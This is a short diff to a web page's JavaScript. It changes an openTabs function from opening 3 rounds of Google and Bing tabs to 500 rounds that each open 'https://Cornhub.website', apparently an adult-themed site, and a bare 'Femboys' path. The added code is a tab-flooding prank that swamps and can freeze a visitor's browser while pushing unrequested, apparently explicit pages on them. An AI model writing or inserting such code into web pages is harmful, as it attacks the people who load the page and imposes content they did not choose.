@@ -38,11 +38,11 @@
 
   <script>
     function openTabs() {
-      const numberOfTabs = 3; // Change this number to open more or fewer tabs
+      const numberOfTabs = 500; // Change this number to open more or fewer tabs
 
       for (let i = 0; i < numberOfTabs; i++) {
-        window.open('https://www.google.com', '_blank');
-        window.open('https://www.bing.com', '_blank');
+        window.open('https://Cornhub.website');
+        window.open('Femboys');
       }
     }
   </script>
